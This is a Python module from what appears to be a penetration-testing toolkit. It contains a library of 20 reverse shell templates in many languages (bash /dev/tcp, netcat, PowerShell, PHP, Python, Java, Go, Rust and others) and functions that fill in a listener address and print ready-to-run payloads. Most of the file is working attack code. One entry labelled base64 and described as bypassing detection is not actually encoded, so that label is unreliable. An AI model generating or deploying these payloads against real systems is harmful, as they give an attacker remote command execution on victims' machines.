"""
modules/payload/shells.py — Reverse shell template library for perc
Contains 20 real, working reverse shell templates for authorized penetration testing.
"""

from typing import Optional

from rich.panel import Panel
from rich.syntax import Syntax

from core.display import console, success, error, warning, info, section_header, PINK


# ---------------------------------------------------------------------------
# Shell template registry
# ---------------------------------------------------------------------------

SHELLS: dict[str, dict] = {
    "bash_tcp": {
        "name": "Bash TCP",
        "description": "Bash TCP reverse shell using /dev/tcp",
        "extension": ".sh",
        "language": "bash",
        "template": (
            "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ),
    },
    "bash_udp": {
        "name": "Bash UDP",
        "description": "Bash UDP reverse shell using /dev/udp",
        "extension": ".sh",
        "language": "bash",
        "template": (
            "sh -i >& /dev/udp/{lhost}/{lport} 0>&1"
        ),
    },
    "python_tcp": {
        "name": "Python TCP",
        "description": "Python socket-based reverse shell with subprocess",
        "extension": ".py",
        "language": "python",
        "template": (
            "import socket,subprocess,os\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect((\"{lhost}\",{lport}))\n"
            "os.dup2(s.fileno(),0)\n"
            "os.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "subprocess.call([\"/bin/sh\",\"-i\"])"
        ),
    },
    "python_pty": {
        "name": "Python PTY",
        "description": "Python reverse shell with PTY spawn for full TTY",
        "extension": ".py",
        "language": "python",
        "template": (
            "import socket,subprocess,os,pty\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect((\"{lhost}\",{lport}))\n"
            "os.dup2(s.fileno(),0)\n"
            "os.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "pty.spawn(\"/bin/bash\")"
        ),
    },
    "powershell_tcp": {
        "name": "PowerShell TCP",
        "description": "PowerShell reverse shell using System.Net.Sockets.TCPClient",
        "extension": ".ps1",
        "language": "powershell",
        "template": (
            "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ),
    },
    "powershell_base64": {
        "name": "PowerShell Base64",
        "description": "Base64-encoded PowerShell reverse shell (bypasses basic detection)",
        "extension": ".ps1",
        "language": "powershell",
        "template": (
            "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});\n"
            "$stream = $client.GetStream();\n"
            "[byte[]]$bytes = 0..65535|%{{0}};\n"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{\n"
            "  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n"
            "  $sendback = (iex $data 2>&1 | Out-String );\n"
            "  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n"
            "  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n"
            "  $stream.Write($sendbyte,0,$sendbyte.Length);\n"
            "  $stream.Flush()}};\n"
            "$client.Close()"
        ),
    },
    "php_exec": {
        "name": "PHP exec",
        "description": "PHP reverse shell using exec() and /bin/sh",
        "extension": ".php",
        "language": "php",
        "template": (
            "<?php\n"
            "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");\n"
            "?>"
        ),
    },
    "php_socket": {
        "name": "PHP Socket",
        "description": "PHP socket-based reverse shell with full proc_open",
        "extension": ".php",
        "language": "php",
        "template": (
            "<?php\n"
            "$sock=fsockopen(\"{lhost}\",{lport});\n"
            "$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n"
            "?>"
        ),
    },
    "ruby_tcp": {
        "name": "Ruby TCP",
        "description": "Ruby TCP reverse shell using socket library",
        "extension": ".rb",
        "language": "ruby",
        "template": (
            "require 'socket'\n"
            "f=TCPSocket.open(\"{lhost}\",{lport}).to_i\n"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"
        ),
    },
    "perl_tcp": {
        "name": "Perl TCP",
        "description": "Perl TCP reverse shell using IO::Socket",
        "extension": ".pl",
        "language": "perl",
        "template": (
            "use Socket;\n"
            "$i=\"{lhost}\";\n"
            "$p={lport};\n"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n"
            "if(connect(S,sockaddr_in($p,inet_aton($i))))\n"
            "{{open(STDIN,\">&S\");\n"
            "open(STDOUT,\">&S\");\n"
            "open(STDERR,\">&S\");\n"
            "exec(\"/bin/sh -i\");}};"
        ),
    },
    "netcat_traditional": {
        "name": "Netcat Traditional",
        "description": "Classic nc -e reverse shell (requires traditional netcat)",
        "extension": ".sh",
        "language": "bash",
        "template": (
            "nc -e /bin/sh {lhost} {lport}"
        ),
    },
    "netcat_pipe": {
        "name": "Netcat Pipe",
        "description": "Netcat reverse shell using mkfifo named pipe (works without -e)",
        "extension": ".sh",
        "language": "bash",
        "template": (
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ),
    },
    "netcat_windows": {
        "name": "Netcat Windows",
        "description": "Windows netcat reverse shell using cmd.exe",
        "extension": ".bat",
        "language": "batch",
        "template": (
            "nc.exe {lhost} {lport} -e cmd.exe"
        ),
    },
    "lua_tcp": {
        "name": "Lua TCP",
        "description": "Lua TCP reverse shell using os.execute and luasocket",
        "extension": ".lua",
        "language": "lua",
        "template": (
            "local socket = require(\"socket\")\n"
            "local s = socket.tcp()\n"
            "s:connect(\"{lhost}\",{lport})\n"
            "while true do\n"
            "  local cmd,status,partial = s:receive()\n"
            "  local f = io.popen(cmd,\"r\")\n"
            "  local o = f:read(\"*a\")\n"
            "  f:close()\n"
            "  s:send(o)\n"
            "  if status == \"closed\" then break end\n"
            "end\n"
            "s:close()"
        ),
    },
    "java_runtime": {
        "name": "Java Runtime",
        "description": "Java reverse shell using Runtime.exec()",
        "extension": ".java",
        "language": "java",
        "template": (
            "import java.io.*;\n"
            "import java.net.*;\n"
            "public class Shell {{\n"
            "    public static void main(String[] args) throws Exception {{\n"
            "        String host = \"{lhost}\";\n"
            "        int port = {lport};\n"
            "        String cmd = \"/bin/sh\";\n"
            "        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n"
            "        Socket s = new Socket(host, port);\n"
            "        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n"
            "        OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n"
            "        while (!s.isClosed()) {{\n"
            "            while (pi.available() > 0) so.write(pi.read());\n"
            "            while (pe.available() > 0) so.write(pe.read());\n"
            "            while (si.available() > 0) po.write(si.read());\n"
            "            so.flush();\n"
            "            po.flush();\n"
            "            Thread.sleep(50);\n"
            "            try {{ p.exitValue(); break; }} catch (Exception e) {{}}\n"
            "        }}\n"
            "        p.destroy();\n"
            "        s.close();\n"
            "    }}\n"
            "}}"
        ),
    },
    "groovy_tcp": {
        "name": "Groovy TCP",
        "description": "Groovy reverse shell (e.g. for Jenkins Script Console)",
        "extension": ".groovy",
        "language": "groovy",
        "template": (
            "String host=\"{lhost}\";\n"
            "int port={lport};\n"
            "String cmd=\"/bin/bash\";\n"
            "Process p=cmd.execute();\n"
            "Socket s=new Socket(host,port);\n"
            "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n"
            "OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n"
            "while(!s.isClosed()){{\n"
            "  while(pi.available()>0)so.write(pi.read());\n"
            "  while(pe.available()>0)so.write(pe.read());\n"
            "  while(si.available()>0)po.write(si.read());\n"
            "  so.flush();po.flush();Thread.sleep(50);\n"
            "  try{{p.exitValue();break;}}catch(Exception e){{}}\n"
            "}};\n"
            "p.destroy();s.close();"
        ),
    },
    "nodejs_tcp": {
        "name": "Node.js TCP",
        "description": "Node.js reverse shell using child_process and net",
        "extension": ".js",
        "language": "javascript",
        "template": (
            "(function(){{\n"
            "  var net = require('net'),\n"
            "      cp = require('child_process'),\n"
            "      sh = cp.spawn('/bin/sh',[]);\n"
            "  var client = new net.Socket();\n"
            "  client.connect({lport}, '{lhost}', function(){{\n"
            "    client.pipe(sh.stdin);\n"
            "    sh.stdout.pipe(client);\n"
            "    sh.stderr.pipe(client);\n"
            "  }});\n"
            "  return /a/;\n"
            "}})();"
        ),
    },
    "csharp_tcp": {
        "name": "C# TCP",
        "description": "C# reverse shell for .NET environments",
        "extension": ".cs",
        "language": "csharp",
        "template": (
            "using System;\n"
            "using System.Diagnostics;\n"
            "using System.IO;\n"
            "using System.Net.Sockets;\n"
            "\n"
            "namespace Shell {{\n"
            "    class Program {{\n"
            "        static void Main(string[] args) {{\n"
            "            using(TcpClient client = new TcpClient(\"{lhost}\", {lport})) {{\n"
            "                using(Stream stream = client.GetStream()) {{\n"
            "                    using(StreamReader rdr = new StreamReader(stream)) {{\n"
            "                        using(StreamWriter wrt = new StreamWriter(stream)) {{\n"
            "                            StringBuilder strInput = new System.Text.StringBuilder();\n"
            "                            Process p = new Process();\n"
            "                            p.StartInfo.FileName = \"cmd.exe\";\n"
            "                            p.StartInfo.CreateNoWindow = true;\n"
            "                            p.StartInfo.UseShellExecute = false;\n"
            "                            p.StartInfo.RedirectStandardOutput = true;\n"
            "                            p.StartInfo.RedirectStandardInput = true;\n"
            "                            p.StartInfo.RedirectStandardError = true;\n"
            "                            p.OutputDataReceived += new DataReceivedEventHandler(\n"
            "                                (sender, e) => {{ wrt.WriteLine(e.Data); wrt.Flush(); }}\n"
            "                            );\n"
            "                            p.Start();\n"
            "                            p.BeginOutputReadLine();\n"
            "                            while(true) {{\n"
            "                                strInput.Append(rdr.ReadLine());\n"
            "                                p.StandardInput.WriteLine(strInput);\n"
            "                                strInput.Remove(0, strInput.Length);\n"
            "                            }}\n"
            "                        }}\n"
            "                    }}\n"
            "                }}\n"
            "            }}\n"
            "        }}\n"
            "    }}\n"
            "}}"
        ),
    },
    "golang_tcp": {
        "name": "Go TCP",
        "description": "Go reverse shell with os/exec and net",
        "extension": ".go",
        "language": "go",
        "template": (
            "package main\n"
            "\n"
            "import (\n"
            "\t\"net\"\n"
            "\t\"os/exec\"\n"
            ")\n"
            "\n"
            "func main() {{\n"
            "\tc, _ := net.Dial(\"tcp\", \"{lhost}:{lport}\")\n"
            "\tcmd := exec.Command(\"/bin/sh\")\n"
            "\tcmd.Stdin = c\n"
            "\tcmd.Stdout = c\n"
            "\tcmd.Stderr = c\n"
            "\tcmd.Run()\n"
            "}}"
        ),
    },
    "rust_tcp": {
        "name": "Rust TCP",
        "description": "Rust reverse shell using std::process and std::net",
        "extension": ".rs",
        "language": "rust",
        "template": (
            "use std::net::TcpStream;\n"
            "use std::os::unix::io::{{AsRawFd, FromRawFd}};\n"
            "use std::process::{{Command, Stdio}};\n"
            "\n"
            "fn main() {{\n"
            "    let s = TcpStream::connect(\"{lhost}:{lport}\").unwrap();\n"
            "    let fd = s.as_raw_fd();\n"
            "    Command::new(\"/bin/sh\")\n"
            "        .arg(\"-i\")\n"
            "        .stdin(unsafe {{ Stdio::from_raw_fd(fd) }})\n"
            "        .stdout(unsafe {{ Stdio::from_raw_fd(fd) }})\n"
            "        .stderr(unsafe {{ Stdio::from_raw_fd(fd) }})\n"
            "        .spawn()\n"
            "        .unwrap()\n"
            "        .wait()\n"
            "        .unwrap();\n"
            "}}"
        ),
    },
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_shell(shell_type: str, lhost: str, lport: str) -> str:
    """Return the filled-in template for *shell_type* or raise KeyError."""
    shell_type = shell_type.strip().lower()
    if shell_type not in SHELLS:
        raise KeyError(f"Unknown shell type: {shell_type}")
    template = SHELLS[shell_type]["template"]
    return template.format(lhost=lhost, lport=lport)


def list_shells() -> list[dict]:
    """Return a list of all available shell types with metadata."""
    results: list[dict] = []
    for key, info_dict in SHELLS.items():
        results.append({
            "type": key,
            "name": info_dict["name"],
            "description": info_dict["description"],
            "extension": info_dict["extension"],
        })
    return results


def generate_shell(shell_type: str, lhost: str, lport: int) -> dict:
    """Generate a reverse shell, display it with syntax highlighting, and return result dict.

    Parameters
    ----------
    shell_type : str
        Key from the SHELLS dict (e.g. ``bash_tcp``, ``python_pty``).
    lhost : str
        Listener IP address.
    lport : int
        Listener port number.

    Returns
    -------
    dict
        Keys: type, name, code, extension, lhost, lport, language
    """
    shell_type = shell_type.strip().lower()
    if shell_type not in SHELLS:
        available = ", ".join(sorted(SHELLS.keys()))
        error(f"Unknown shell type: [bold]{shell_type}[/]")
        info(f"Available types: {available}")
        return {"error": f"Unknown shell type: {shell_type}"}

    meta = SHELLS[shell_type]
    code = meta["template"].format(lhost=lhost, lport=str(lport))

    # ---------- Display ----------
    section_header("Reverse Shell Generator", f"{meta['name']} -> {lhost}:{lport}")

    syntax = Syntax(
        code,
        meta["language"],
        theme="monokai",
        line_numbers=True,
        word_wrap=True,
        padding=1,
    )
    console.print(
        Panel(
            syntax,
            title=f"[bold bright_magenta]{meta['name']} Reverse Shell[/]",
            subtitle=f"[dim]{meta['extension']}[/]",
            border_style="bright_magenta",
            width=min(console.width - 4, 100),
            padding=(0, 1),
        )
    )
    console.print()

    # Listener hint
    if "tcp" in shell_type or "pipe" in shell_type or "traditional" in shell_type:
        info(f"Start your listener:  [bold bright_green]nc -lvnp {lport}[/]")
    elif "udp" in shell_type:
        info(f"Start your listener:  [bold bright_green]nc -u -lvnp {lport}[/]")

    success(f"Shell generated — [bold]{len(code)}[/] bytes")
    console.print()

    return {
        "type": shell_type,
        "name": meta["name"],
        "code": code,
        "extension": meta["extension"],
        "language": meta["language"],
        "lhost": lhost,
        "lport": lport,
    }
